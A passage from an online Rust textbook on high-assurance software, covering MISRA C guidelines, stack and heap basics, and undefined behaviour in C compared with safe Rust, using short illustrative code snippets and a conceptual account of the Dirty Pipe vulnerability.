While the Rust Team strives for a cohesive design<sup class="footnote-reference" id="fr-BuildJosh-1"><a href="#footnote-BuildJosh">3</a></sup>, the language juggles several influences.</p>
<p>Fortunately for us, you don't need an exhaustive understanding of Rust to be productive in it.
This section previews key concepts - just enough to get you started reading and writing Rust snippets.
We'll cement those concepts in the rest of the book by building an embedded-friendly, high assurance library.</p>
<p>With that as a foundation, you'll be prepared to write your own real-world Rust programs.
And to tackle learning additional language features (smart pointers, channels, async, macros, etc) as project needs arise.</p>
<p>Our tour of Rust will be broken into six short-ish parts:</p>
<ol>
<li>
<p><strong>Low-Level Data Representation</strong> - primitives, tuples, arrays, references, and slices.</p>
</li>
<li>
<p><strong>High-level Data Representation</strong> - structs, enums, generics, and traits.</p>
</li>
<li>
<p><strong>Control Flow</strong> - conditional statements, loops, and pattern matching.</p>
</li>
<li>
<p><strong>Ownership Principles</strong> - understanding the core principles of Rust's most novel feature.</p>
</li>
<li>
<p><strong>Ownership in Practice</strong> - concepts for working with ownership day-to-day.</p>
</li>
<li>
<p><strong>Error Handling</strong> - propagating failures and/or maintaining availability.</p>
</li>
</ol>
<h2 id="emphasizing-field-tested-assurance-guidelines"><a class="header" href="#emphasizing-field-tested-assurance-guidelines">Emphasizing Field-tested Assurance Guidelines</a></h2>
<p>This book is an introduction to building robust, reliable, and secure systems.
Hence the <em>zero-crash</em> pun in this chapter's title.</p>
<p>To emphasize actionable assurance techniques, we'll frame our Rust tour in the context of a well-established industry standard.
On wisdom tested in the most unforgiving of production environments.</p>
<p>The Motor Industry Software Reliability Association (MISRA) C<sup class="footnote-reference" id="fr-MISRA-1"><a href="#footnote-MISRA">4</a></sup> guidelines are a set of C software development rules originally created for, as the acronym implies, the automotive industry.</p>
<p>Unlike a <em>style</em> guide, MISRA C outlines <em>best practices</em> for developers of safety-critical systems.
It's intended to maximize reliability, security, and maintainability<sup class="footnote-reference" id="fr-AntiMISRA-1"><a href="#footnote-AntiMISRA">5</a></sup>.
For systems in which a bug can potentially endanger lives.</p>
<p>Today, these guidelines are widely used in the aerospace, defense, telecommunication, and medical device industries (in addition to industry-specific frameworks like DO-178C<sup class="footnote-reference" id="fr-DO-178C-1"><a href="#footnote-DO-178C">6</a></sup> and ISO-26262<sup class="footnote-reference" id="fr-ISO-26262-1"><a href="#footnote-ISO-26262">7</a></sup>).
The most recent version<sup class="footnote-reference" id="fr-MISRA_2012-1"><a href="#footnote-MISRA_2012">8</a></sup> introduces itself as:</p>
<blockquote>
<p>The MISRA C Guidelines define a subset of the C language in which the opportunity to make mistakes is either removed or reduced.
Many standards for the development of safety-related software require, or recommend, the use of a language subset, and this can also be used to develop any application with security, high integrity or high reliability requirements.</p>
</blockquote>
<p>MISRA C has been tested and refined over decades.
Even outside of regulatory certification, these are practical guidelines for building high assurance systems.</p>
<p>Rust's core design is directly applicable to building safe, reliable software.
Because we won't use the <code>unsafe</code> keyword, you could say that this book introduces a safe subset of the Rust language.</p>
<blockquote>
<p><strong>A "Safe Subset" for Our Purposes</strong></p>
<p>What truly constitutes a "safe subset" of the Rust programming language is the subject of current standardization and research efforts.
We will not attempt to formally define a safe subset in this book.</p>
<p>Instead, for our core project, we'll use two crate-wide macros to restrict ourselves to what a practicing engineer could consider a "safe subset":</p>
<ul>
<li>
<p><code>#![forbid(unsafe_code)]</code>: Usage of the <code>unsafe</code> keyword is a compile-time error. This helps us maximize Rust's static guarantees.</p>
</li>
<li>
<p><code>#![no_std]</code>: We don't use standard library facilities (which contain <code>unsafe</code> code). More strictly, we opt out of all dynamic memory usage. Not relying on an external allocator has certain robustness benefits.</p>
</li>
</ul>
<p>Because the core project is based on an open-source library<sup class="footnote-reference" id="fr-Scapegoat-1"><a href="#footnote-Scapegoat">9</a></sup>, we know that working within these constraints is viable for non-trivial codebases.</p>
</blockquote>
<p>Now, being a new language, Rust is not yet widely certified for use in safety-critical settings - although this is an area of industry effort<sup class="footnote-reference" id="fr-Ferrocene-1"><a href="#footnote-Ferrocene">10</a></sup> and research<sup class="footnote-reference" id="fr-RustCrit-1"><a href="#footnote-RustCrit">11</a></sup>.
There is a qualified Rust compiler for automotive (ISO 26262) and industrial (IEC 61508) usecases, but there is no Rust counterpart to the MISRA C guidelines.
Yet.</p>
<p>Many MISRA C rules are specific to the C language.
We'll split a portion of the remainder into two categories, using these labels to differentiate:</p>
<ul>
<li>
<p><strong>Automated by Rust (AR):</strong> Rule that is easy to follow consistently or natural to express in idiomatic Rust. For any Rust program, if it compiles it likely adheres to this category.</p>
</li>
<li>
<p><strong>Reliably for Rust (RR):</strong> Rule generally applicable to the design and implementation of programs prioritizing correctness and robustness. Can be readily applied in Rust, just not automatically. Conscious effort is required on the programmer's part.</p>
</li>
</ul>
<p>As we introduce a safe subset of the Rust language, we'll occasionally highlight an applicable MISRA C<sup class="footnote-reference" id="fr-MISRA_2012-2"><a href="#footnote-MISRA_2012">8</a></sup> rule.
Both in this chapter and throughout the book, preceded by one the the labels above.</p>
<p>As a preview - here's three MISRA C rules we'll conform to for the core library we write (but not for development tools we build or use, since those aren't safety-critical):</p>
<blockquote>
<p><strong>[RR, Directive 4.1]</strong> Minimize runtime failures<sup class="footnote-reference" id="fr-MISRA_2012-3"><a href="#footnote-MISRA_2012">8</a></sup></p>
</blockquote>
<blockquote>
<p><strong>[RR, Directive 4.12]</strong> Do not use dynamic memory allocation<sup class="footnote-reference" id="fr-MISRA_2012-4"><a href="#footnote-MISRA_2012">8</a></sup></p>
</blockquote>
<blockquote>
<p><strong>[RR, Rule 17.2]</strong> Functions can't call themselves recursively (directly or indirectly)<sup class="footnote-reference" id="fr-MISRA_2012-5"><a href="#footnote-MISRA_2012">8</a></sup></p>
</blockquote>
<p>Note we're omitting rationale.
Which can be convincing, if the above three rules appear restrictive.
Fortunately, Rust makes it feasible and ergonomic to meet this sort of high assurance criteria.</p>
<blockquote>
<p><strong>A Distinct Take on MISRA C</strong></p>
<p>To be cautious of respecting copyright, we'll only provide a rough paraphrase of each MISRA rule's "heading" - not its exact phrasing, full explanation, rationale, exceptions, category, etc.
This is the same approach taken by academic publications<sup class="footnote-reference" id="fr-MisraPub-1"><a href="#footnote-MisraPub">12</a></sup> that enumerate MISRA rules.</p>
<p>In several cases, our paraphrase will introduce Rust-specific terminology not present in the MISRA C Guidelines.
Unlike prior work mapping MISRA rules to Rust<sup class="footnote-reference" id="fr-MisraRust-1"><a href="#footnote-MisraRust">13</a></sup>, we're not aiming to be exhaustive.
We're sampling rules for the purpose of learning assurance concepts.</p>
</blockquote>
<p>We can taxonomize the MISRA rules and directives mentioned in this chapter as follows:</p>
<br>
<p align="center">
  <img width="100%" src="chp3/misra.svg">
  <figure>
  <figcaption><center>A visual breakdown of our MISRA sample (rules mentioned in this chapter).</center></figcaption><br>
  </figure>
</p>
<p>At a high-level, <strong>directives</strong> are MISRA rules that are difficult to describe in a definitive, universal way.
Directives tend to be harder to check and validate in a complex system.
<strong>Rules</strong>, on the other hand, are possible to completely capture.
They can often be validated with accuracy by static analysis tools (like the Rust compiler).</p>
<p>Again, note that our sample of MISRA rules and directives isn't exhaustive.
If you're a professional safety or security engineer, we recommend purchasing the full MISRA C 2012 Guidelines from MISRA itself.
Understanding widely-adopted best practices is valuable, regardless of the specific toolchain a project uses.</p>
<h2 id="software-engineering-in-rust"><a class="header" href="#software-engineering-in-rust">Software Engineering in Rust</a></h2>
<p>High assurance or not, modern development is about more than language syntax and language features.
It involves tools, processes, and, most importantly, people: external customers and internal teams.</p>
<p>Professional experience is the best way to learn how to implement effective processes and serve the needs of stakeholders.
We'll focus on tools in this book.</p>
<p>Using <code>clap</code> in the last chapter already gave us a taste for integrating 3rd party libraries into our builds.
We also leveraged Rust's built-in, 1st-party unit testing framework to verify our RC4 implementation against official test vectors.
Yet we've only scratched the surface on what <code>cargo</code> can do to aid day-to-day development tasks.
The Cargo Book<sup class="footnote-reference" id="fr-CargoBook-1"><a href="#footnote-CargoBook">14</a></sup> offers a more complete overview.</p>
<p>In this chapter, we'll highlight a few more components of Rust's tooling ecosystem, both 1st and 3rd party.
We'll also discuss Rust's release cycle to understand how stability is enabled for production systems.
More generally, we'll cover a key pillar of successful software projects: code organization.</p>
<h2 id="brief-prerequisites-stack-heap-values"><a class="header" href="#brief-prerequisites-stack-heap-values">Brief Prerequisites: Stack, Heap, Values</a></h2>
<p>This chapter will occasionally use two technical terms: "stack" and "heap".
In this context, these terms refer to two kinds of <em>distinct memory locations</em>.
Not the data structures of the same name (an unfortunate jargon overload).</p>
<p>The next chapter will discuss memory in detail.
For now, think of it like this:</p>
<ul>
<li>
<p><strong>Stack memory</strong> is short-term (live for function call duration) storage that's readily available. However, it can <strong>only store fixed-size</strong> variables.</p>
<ul>
<li>
<p>The mechanics of the stack are closely related to CPU hardware. In fact, many processors have a specific register called a "stack pointer".</p>
</li>
<li>
<p>Stack memory works like the stack data structure - memory "frames" are <em>Last In First Out (LIFO).</em></p>
</li>
<li>
<p>Integers and arrays are stored on the stack by default.</p>
</li>
</ul>
</li>
<li>
<p><strong>Heap memory</strong> is long-term (live until freed) storage that has to be requested explicitly and cleaned up later. But it can store variables whose <strong>size is decided at runtime</strong>.</p>
<ul>
<li>
<p>The mechanics of the heap are handled by software, but map to DRAM hardware. A memory allocation library, typically working in tandem with the OS<sup class="footnote-reference" id="fr-Malloc-1"><a href="#footnote-Malloc">15</a></sup>, implements complex logic to manage chunks of RAM.</p>
</li>
<li>
<p>Vectors and non-literal strings are typically stored on the heap.</p>
</li>
</ul>
</li>
</ul>
<p>The stack/heap distinction is a computer architecture concern that needs to show up in the syntax of systems programming languages.
Programming "close to the metal" requires a mental model that reflects the hardware/software interface.</p>
<p>"Value" is another term this chapter makes use of.
It's a concept that spans every kind of programming language:</p>
<ul>
<li>A <strong>value</strong> is a memory-location-independent <em>concrete instance</em> of typed data.</li>
</ul>
<p>For example, in <code>let string_literal = "Hello, World!";</code>, <code>string_literal</code> is a <em>variable</em> (label) assigned the <em>value</em> <code>"Hello, World!"</code>. This value has two parts:</p>
<ol>
<li>
<p>A type (here, <code>T: &amp;'static str</code> - we'll break down how to read that signature)</p>
</li>
<li>
<p>A concrete bit-pattern (whatever encodes the specific UTF-8 string <code>"Hello, World!"</code>).</p>
</li>
</ol>
<p>With that out of the way, let's start the zero-crash course.</p>
<h2 id="learning-outcomes-2"><a class="header" href="#learning-outcomes-2">Learning Outcomes</a></h2>
<ul>
<li>Learn key guidelines for writing high assurance software.</li>
<li>Understand "Undefined Behavior" and its implications.</li>
<li>Learn core Rust language features, get comfortable reading/writing Rust snippets.</li>
<li>Learn must-have Rust tooling to ease day-to-day software engineering tasks.</li>
</ul>
<hr>
<ol class="footnote-definition"><li id="footnote-ProgRust">
<p><a href="https://amzn.to/35cu1Za"><em><strong>[PERSONAL FAVORITE]</strong> Programming Rust: Fast, Safe Systems Development</em></a>. Jim Blandy, Jason Orendorff, Leonora Tindall (2021). <a href="#fr-ProgRust-1">↩</a></p>
</li>
<li id="footnote-RustInfluences">
<p><a href="https://doc.rust-lang.org/reference/influences.html"><em>The Rust Reference: Influences</em></a>. The Rust Team (2021). <a href="#fr-RustInfluences-1">↩</a></p>
</li>
<li id="footnote-BuildJosh">
<p><a href="https://anchor.fm/building-with-rust/episodes/Josh-Triplett-on-Building-the-Build-System-of-his-Dreams-e1dt81c"><em>Josh Triplett on Building the Build System of his Dreams</em></a>. Sean Chen (2022). <a href="#fr-BuildJosh-1">↩</a></p>
</li>
<li id="footnote-MISRA">
<p><a href="https://www.misra.org.uk/misra-c/"><em>MISRA C</em></a>. MISRA (Accessed 2022). <a href="#fr-MISRA-1">↩</a></p>
</li>
<li id="footnote-AntiMISRA">
<p><a href="https://ieeexplore.ieee.org/abstract/document/4658076"><em>Assessing the Value of Coding Standards: An Empirical Study</em></a>. Cathal Boogerd, Leon Moonen (2008). This paper, which evaluated the MISRA C 2004 standard, makes the claim that only 12 of 72 MISRA rules were significantly effective for fault detection and that adherence to certain rules might, counter intuitively, actually <em>increase</em> fault rate. These conclusions are controversial, MISRA C and similar coding standards continue to be best practices in several industries. Outside of a subsequent study by the same authors, we couldn't find other research arriving at similar conclusions. But such claims are worth noting for completeness. We encourage readers to maintain a mindset of healthy skepticism! At the very least, we can agree there is nuance to the impact and application of coding standards. <a href="#fr-AntiMISRA-1">↩</a></p>
</li>
<li id="footnote-DO-178C">
<p><a href="https://en.wikipedia.org/wiki/DO-178C"><em>DO-178C</em></a>. Wikipedia (Accessed 2022). <a href="#fr-DO-178C-1">↩</a></p>
</li>
<li id="footnote-ISO-26262">
<p><a href="https://en.wikipedia.org/wiki/ISO_26262"><em>ISO 26262</em></a>. Wikipedia (Accessed 2022). <a href="#fr-ISO-26262-1">↩</a></p>
</li>
<li id="footnote-MISRA_2012">
<p><em>MISRA C: 2012 Guidelines for the use of the C language in critical systems (3rd edition)</em>. MISRA (2019). <a href="#fr-MISRA_2012-1">↩</a> <a href="#fr-MISRA_2012-2">↩2</a> <a href="#fr-MISRA_2012-3">↩3</a> <a href="#fr-MISRA_2012-4">↩4</a> <a href="#fr-MISRA_2012-5">↩5</a></p>
</li>
<li id="footnote-Scapegoat">
<p><a href="https://github.com/tnballo/scapegoat"><em><code>scapegoat</code></em></a>. Tiemoko Ballo (Accessed 2022). <a href="#fr-Scapegoat-1">↩</a></p>
</li>
<li id="footnote-Ferrocene">
<p><a href="https://ferrous-systems.com/ferrocene/">Ferrocene</a>. Ferrous Systems (2021). <a href="#fr-Ferrocene-1">↩</a></p>
</li>
<li id="footnote-RustCrit">
<p><a href="https://ieeexplore.ieee.org/document/8990314"><em>Towards Rust for Critical Systems</em></a>. Andre Pinho, Luis Couto, Jose Oliveira (2019). <a href="#fr-RustCrit-1">↩</a></p>
</li>
<li id="footnote-MisraPub">
<p><a href="https://arxiv.org/pdf/1809.00821.pdf"><em>The MISRA C Coding Standard and its Role in the Development and Analysis of Safety- and Security-Critical Embedded Software</em></a>. Roberto Bagnara, Abramo Bagnara, and Patricia Hill (2018). <a href="#fr-MisraPub-1">↩</a></p>
</li>
<li id="footnote-MisraRust">
<p><a href="https://github.com/PolySync/misra-rust/blob/master/MISRA-Rules.md"><em>MISRA-Rust</em></a>. Shea Newton (Accessed 2022). <a href="#fr-MisraRust-1">↩</a></p>
</li>
<li id="footnote-CargoBook">
<p><a href="https://doc.rust-lang.org/cargo/"><em>The Cargo Book</em></a>. The Cargo Team (Accessed 2022). <a href="#fr-CargoBook-1">↩</a></p>
</li>
<li id="footnote-Malloc">
<p>A user space "memory allocator" can issue "system calls" to an OS to grow heap capacity as needed. If your program uses heap memory, it must link against this runtime support library. This is extremely common, it's how most programs work. <a href="#fr-Malloc-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="on-undefined-behavior"><a class="header" href="#on-undefined-behavior">On Undefined Behavior</a></h1>
<p>One of MISRA C's driving goals is reducing the amount of "Undefined Behavior" (UB) <sup class="footnote-reference" id="fr-MISRA_TALK-1"><a href="#footnote-MISRA_TALK">1</a></sup> present in a codebase.
We made passing mention of UB in Chapter 1, but it's an essential concept.
Eliminating UB is necessary, but not sufficient, for high assurance software.
So let's tackle the topic now, before we get into Rust syntax.</p>
<p>The ISO C standard<sup class="footnote-reference" id="fr-ISOC-1"><a href="#footnote-ISOC">2</a></sup> defines <strong>behavior</strong> as:</p>
<blockquote>
<p>External appearance or action.</p>
</blockquote>
<p>Consequently, <strong>Undefined Behavior (UB)</strong> is defined as<sup class="footnote-reference" id="fr-ISOC-2"><a href="#footnote-ISOC">2</a></sup>:</p>
<blockquote>
<p>Behavior, upon use of a nonportable or erroneous program construct or of erroneous data, for which this International Standard imposes no requirements.</p>
</blockquote>
<p>In other words, should a developer inadvertently trigger UB, <em>the program can do absolutely anything</em>.
It may crash, produce an incorrect result, or even execute a sequence of seemingly unrelated operations<sup class="footnote-reference" id="fr-NasalDemons-1"><a href="#footnote-NasalDemons">3</a></sup>.</p>
<p>Notice we didn't say "the undefined operation can do absolutely anything", we said "the program".
It's important to understand one fact about UB:</p>
<ul>
<li>Once undefined behavior is triggered, the adverse impact often cannot be <em>localized</em>. It may compromise the security and/or reliability of the <em>entire</em> system.</li>
</ul>
<p>UB is an undesirable source of bugs and vulnerabilities.
Yet UB is ingrained into both C and C++ standards for a variety of complex historical reasons.
Removing even a small portion of UB from either language would break a large percentage of available compilers or their ability to compile existing code.
So it's unlikely to happen.</p>
<p>The best we can do is make a diligent effort to avoid it.
That means heavy auditing and thorough testing of C-family codebases and, where possible, introducing Rust.</p>
<h2 id="how-easy-is-it-to-introduce-ub-in-c"><a class="header" href="#how-easy-is-it-to-introduce-ub-in-c">How easy is it to introduce UB in C?</a></h2>
<p>C and C++ programs are, relative to memory-safe languages, difficult to debug and easy to exploit because introducing UB is both <em>trivial</em> and <em>common</em>.</p>
<p>Researchers have found instances of UB in widely used projects, like the Linux kernel and PostgreSQL<sup class="footnote-reference" id="fr-UndefResearch-1"><a href="#footnote-UndefResearch">4</a></sup>.
Memory corruption bugs, whose severity and prevalence we discussed in Chapter 1, are just one consequence of UB.</p>
<p>Let's get a tangible feel for what UB looks like.
Consider the below C program - what does it return?</p>
<pre><code class="language-c ignore">#include &lt;stdio.h&gt;

int undef_func() {
    int uninit_var; // Never assigned to!
    if (uninit_var &gt; 0) {
        return 1;
    } else {
        return 0;
    }
}

int main() {
    printf("%d\n", undef_func());
}
</code></pre>
<p>That was a trick question.
The answer is <code>1</code> or <code>0</code>, depending whatever just happened to be in memory at the time.
Simply because the <code>if</code> statement read an uninitialized value and then branched on the result.
The C Standard (6.7.8, paragraph 10<sup class="footnote-reference" id="fr-ISOC-3"><a href="#footnote-ISOC">2</a></sup>) states:</p>
<blockquote>
<p>If an object that has automatic storage duration is not initialized explicitly, its value is indeterminate.</p>
</blockquote>
<p>In the context of the C standard, "indeterminate" means a variable can either:</p>
<ul>
<li>
<p>Take on any legal value for the type (e.g. "unspecified value").</p>
</li>
<li>
<p>Take on a value that doesn't represent any instance of the type (e.g."trap representation"). UB ensues.</p>
</li>
</ul>
<p>Neither case bodes well for program reliability.
This simple function violates a MISRA C rule that explicitly targets this part of the standard:</p>
<blockquote>
<p><strong>[AR, Rule 9.1]</strong> The value of an object shouldn't be read if it hasn't been written<sup class="footnote-reference" id="fr-MISRA_2012-1"><a href="#footnote-MISRA_2012">5</a></sup></p>
</blockquote>
<p>By default <code>gcc</code> - a popular, open-source C compiler - will not warn about this serious error.
We have to remember to pass the <code>-Wall</code> flag to get the below warning, and even then the program will build and run:</p>
<pre><code class="language-ignore">undef.c: In function ‘undef_func’:
undef.c:5:8: warning: ‘uninit_var’ is used uninitialized in this function [-Wuninitialized]
    5 |     if (uninit_var &gt; 0) {
      |        ^
</code></pre>
<p>Unfortunately, remembering special compiler flags is not a general solution.
C has <em>hundreds</em> of possible undefined behaviors and the <em>vast majority</em> cannot be caught by compiler warnings.
Thus, these "misbehaviors" rapidly creep into codebases as they grow in complexity.</p>
<blockquote>
<p><strong>What's a real example of this problem? In a security context?</strong></p>
<p>CVE-2022-0847, aka "Dirty Pipe", was a highly exploitable vulnerability affecting Linux kernel versions after 5.8 (patched in stable releases 5.16.11, 5.15.25 and 5.10.102.<sup class="footnote-reference" id="fr-DirtyPipe-1"><a href="#footnote-DirtyPipe">6</a></sup>).
A code refactor caused a structure's field to be uninitialized, and the instance of UB wasn't caught by compiler warnings or testing.</p>
<p>The uninitialized field was the <code>flags</code> member of a kernel-space <code>pipe_buffer</code> data structure.
This is used by the kernel to set up "pipes", an Inter-Process Communication (IPC) mechanism.</p>
<p>By performing a sequence of normal, unprivileged operations, an attacker could reliably control the in-memory value that would later be read (instead of being reset/initialized correctly) as a flag for page cache write permissions<sup class="footnote-reference" id="fr-DirtyPipe-2"><a href="#footnote-DirtyPipe">6</a></sup>.</p>
<p>By abusing this ill-gotten permission to pipe into files, an attacker can overwrite small chunks of content in system files that should be read-only.
This can enable, among other things, changing the root password to escalate local privileges and then overwriting SSH key data used for remote access.</p>
<p>Effectively, an attacker can gain "full control" of a vulnerable system just by getting a user to execute an unprivileged program. All because of one uninitialized field!
Give the attacker an inch, they might take a mile.</p>
</blockquote>
<h2 id="lets-try-that-in-rust"><a class="header" href="#lets-try-that-in-rust">Let's try that in Rust</a></h2>
<p>Undefined behavior is still possible in Rust, if using <code>unsafe</code> keyword<sup class="footnote-reference" id="fr-UndefRust-1"><a href="#footnote-UndefRust">7</a></sup>, but it's <em>almost eliminated</em> in the safe subset of Rust.
That's a major part of why the Rust language is so amenable to writing correct, reliable software.
Rust removes UB, nearly entirely, by default.</p>
<blockquote>
<p><strong>Why the "almost eliminated" and "nearly entirely" caveats?</strong></p>
<p>At the time of this writing, Rust does not yet have an <em>official</em> language standard or specification.
There's no Rust equivalent to C or C++'s ISO documents.
So it's difficult to make a definitive claim.</p>
<p>The Rust Reference contains a non-exhaustive list of behaviors considered undefined in Rust<sup class="footnote-reference" id="fr-UndefRust-2"><a href="#footnote-UndefRust">7</a></sup>, all of which would require the <code>unsafe</code> keyword to introduce.
So there are likely only three potential sources of UB in Rust:</p>
<ul>
<li>
<p><code>unsafe</code> functions or blocks whose invariants aren't actually upheld (our fault). This includes FFI edge cases, like a foreign exception crossing the FFI boundary with an unsupported ABI.</p>
</li>
<li>
<p>Rare compiler bugs<sup class="footnote-reference" id="fr-RustcBug-1"><a href="#footnote-RustcBug">8</a></sup> that threaten soundness (patched once discovered).</p>
</li>
<li>
<p>Platform-specific invariant violations, like executing a program compiled with support for specific CPU extensions on a CPU variant that doesn't support them (deployment problem).</p>
</li>
</ul>
<p>In July of 2022, the Ferrocene Language Specification (FLS)<sup class="footnote-reference" id="fr-FLS-1"><a href="#footnote-FLS">9</a></sup> was made public.
The specification supports Ferrocene, a commercial downstream of the Rust compiler qualified for certain safety-critical uses.
While this specification does not aim to document the entire Rust language and standard library, it currently enumerates 21 possible sources of UB in Rust programs<sup class="footnote-reference" id="fr-FLSUndef-1"><a href="#footnote-FLSUndef">10</a></sup>.</p>
<p>We'll use <code>miri</code><sup class="footnote-reference" id="fr-Miri-1"><a href="#footnote-Miri">11</a></sup>, an experimental dynamic tool for detecting UB in Rust programs, in Chapter 12.</p>
</blockquote>
<p>To make Rust's benefits more visceral, let's port our buggy C program to Rust:</p>
<pre><code class="language-rust ignore">fn undef_func() -&gt; isize {
    let uninit_var: isize;
    if uninit_var &gt; 0 {
        return 1;
    } else {
        return 0;
    }
}

fn main() {
    println!("{}\n", undef_func());
}</code></pre>
<p>Running <code>cargo build</code> results in the following:</p>
<pre><code class="language-ignore">error[E0381]: use of possibly-uninitialized variable: `uninit_var`
 --&gt; src/main.rs:3:8
  |
3 |     if uninit_var &gt; 0 {
  |        ^^^^^^^^^^ use of possibly-uninitialized `uninit_var`

For more information about this error, try `rustc --explain E0381`.
</code></pre>
<p>The <code>gcc</code> warning was similar, but heeding it was entirely optional.
In Rust, this same mistake is a hard error - the program will not compile unless we address the issue.
In other words, all safe Rust programs obey the aforementioned MISRA C Rule 9.1.</p>
<p>More generally, successfully compiling a safe Rust project means UB is likely eliminated.
So obeying the below buys us a great deal of assurance:</p>
<blockquote>
<p><strong>[RR, Directive 2.1]</strong> The entire project should compile without error<sup class="footnote-reference" id="fr-MISRA_2012-2"><a href="#footnote-MISRA_2012">5</a></sup></p>
</blockquote>
<h2 id="why-does-ub-even-exist"><a class="header" href="#why-does-ub-even-exist">Why does UB even exist?</a></h2>
<p>Let's assume it's desirable to have multiple compilers for a language, whether they be commercial or open-source.
Each compiler implementation may serve a different niche, offer unique features, or just experiment with promising ideas.
Just like we have multiple web browsers that all support the same standards and protocols (HTML, HTTP2, etc).</p>
<p>Thus, a singular language standard (like the ISO C standard<sup class="footnote-reference" id="fr-ISOC-4"><a href="#footnote-ISOC">2</a></sup> we've mentioned) needs to be applicable to any compiler implementation targeting any platform architecture.
This is akin to an interface design problem.
It entails designing failure modes, which is where UB comes in<sup class="footnote-reference" id="fr-CppUndef-1"><a href="#footnote-CppUndef">12</a></sup> - it's one way to "handle" edge cases the standard won't, shouldn't, or can't impose a universal rule for.</p>
<p>So the standard draws a boundary: it defines an "abstract machine" general enough to represent a variety of underlying hardware.
This has the upside of giving compiler developers room to introduce platform-specific optimizations.
Which is one of the main jobs of a compiler: it repeatedly applies <em>rewrite rules</em> to generate efficient machine code.</p>
<p>An optimizing compiler assumes that input source code never introduces UB, per the language specification.
If this assumption is:</p>
<ul>
<li>
<p><strong>True</strong> (source is indeed UB-free) - rewrite rules replace existing code with new code that is both faster and <em>logically equivalent</em>.</p>
<ul>
<li>These rules often take advantage of the "wiggle room" an abstract specification provides to play with architecture-specific instruction and/or memory model semantics. Or remove checks that prove necessary<sup class="footnote-reference" id="fr-RalfUB-1"><a href="#footnote-RalfUB">13</a></sup>.</li>
</ul>
</li>
<li>
<p><strong>False</strong> (source contains UB) - application of rewrite rules may lead to <em>logical contradiction</em>.</p>
<ul>
<li>If the UB present is "triggered", results include incorrect code replacements and/or arbitrary runtime operations.</li>
</ul>
</li>
</ul>
<p>This dichotomy begs the question: couldn't a sufficiently "smart" compiler simply <em>verify</em> its assumption of UB-free source?
Just like it checks syntax and typing at compile time?</p>
<p>The answer is yes!
As alluded to, that's exactly what <code>rustc</code> does when compiling fully-safe Rust code<sup class="footnote-reference" id="fr-IntOverflow-1"><a href="#footnote-IntOverflow">14</a></sup>.
Using a combination of its advanced type system and runtime check insertion.</p>
<p>But guaranteeing absence of all UB automatically is technically infeasible for C, C++, <em>and</em> <code>unsafe</code> Rust.
Futhermore, even the safest of Rust programs might link against <em>some</em> <code>unsafe</code> code internally, like C's <code>libc</code> or parts of Rust's <code>core</code><sup class="footnote-reference" id="fr-Core-1"><a href="#footnote-Core">15</a></sup>.
From an assurance perspective, we're betting that such widely-used and well-vetted dependencies are less likely to contain UB than <code>unsafe</code> code we'd write ourselves.</p>
<blockquote>
<p><strong>What's an example of an optimization?</strong></p>
<p>John Regehr presented a compelling snippet in a 2017 talk<sup class="footnote-reference" id="fr-CppUndef-2"><a href="#footnote-CppUndef">12</a></sup>, we'll adapt it here.
Say we have this function:</p>
<pre><code class="language-c">int set(int* a, int* b) {
   *b = 3;
   *a = 7;
   return *b;
}
</code></pre>
<p><code>a</code> and <code>b</code> are pointers to the same type, <code>int</code>, and they may alias (recall our discussion of pointers and aliasing from Chapter 2).
That means the function should return <code>3</code> if the pointers don't alias or <code>7</code> if they do.</p>
<p>Thus, the compiler is forced to generate machine code that <em>loads from memory</em> before returning an integer.
It needs to read the freshest data to handle both the alias and no-alias cases.
Something akin to the following snippet of x86-64 assembly may be emitted (ATT syntax):</p>
<pre><code class="language-assembly">set:
  movl $3, (%rsi)
  movl $7, (%rdi)
  movl (%rsi), %eax
</code></pre>
<p>If you're not familiar with x86 assembly, the key idea here is that the last line is a load from a memory address:</p>
<ul>
<li>
<p><code>%rsi</code> is a register holding a pointer.</p>
</li>
<li>
<p><code>(%rsi)</code> is a dereference of the pointer, we read the data it points to.</p>
</li>
<li>
<p><code>movl (%rsi), %eax</code> copies the data read into <code>%eax</code>, the register used for return values<sup class="footnote-reference" id="fr-EAX-1"><a href="#footnote-EAX">16</a></sup>.</p>
</li>
</ul>
<p>Now say the two parameters are pointers to different integer types:</p>
<pre><code class="language-c">int set(long* a, int* b) {
   *b = 3;
   *a = 7;
   return *b;
}
</code></pre>
<p>In this case the compiler can, per the C standard's definition of "strict aliasing", assume that the pointers don't alias.
We no longer need to read a current value from memory, we can return a constant <code>3</code>.
That's faster.
This optimization may result in assembly like:</p>
<pre><code class="language-assembly">set:
  movl $3, (%rsi)
  movq $7, (%rdi)
  movl $3, %eax
</code></pre>
<p>Great, we got more efficient code.
There's no read in the last instruction, just a move of constant.</p>
<p>So what's the problem?
A C programmer can break that assumption by casting an <code>int*</code> to a <code>long*</code> before calling the function.
Behavior of the below program is undefined:</p>
<pre><code class="language-c">include &lt;stdio.h&gt;

int set(long* a, int* b) {
    *b = 3;
    *a = 7;
    return *b;
}

int main() {
    int x = 0;
    printf("%d\n", set((long*)&amp;x, &amp;x));
}
</code></pre>
<p>For various reasons, casting is a common operation in C and C++ programs.
Projects like the Linux kernel explicitly disable this specific optimization for safety<sup class="footnote-reference" id="fr-UndefResearch-2"><a href="#footnote-UndefResearch">4</a></sup>.</p>
<p>In safe Rust, we can't cast references. And we're able to guarantee absence of mutable aliasing at all times.
So, in this particular case, Rust is capable of performing the optimization without the UB danger.</p>
</blockquote>
<h2 id="what-are-the-consequences-of-ub-in-practice"><a class="header" href="#what-are-the-consequences-of-ub-in-practice">What are the consequences of UB in practice?</a></h2>
<p>There are four possible outcomes<sup class="footnote-reference" id="fr-CppUndef-3"><a href="#footnote-CppUndef">12</a></sup>.
We can enumerate them, roughly in order of best to worst case:</p>
<ol>
<li>
<p><strong>Program breaks immediately:</strong> Crash (e.g. segmentation fault) or exception (e.g. attempt to divide by zero) will be hit at runtime, the program will halt .</p>
<ul>
<li>The easiest case to detect prior to shipping a product. We just need to execute the faulty code path once, in a dynamic test.</li>
</ul>
</li>
<li>
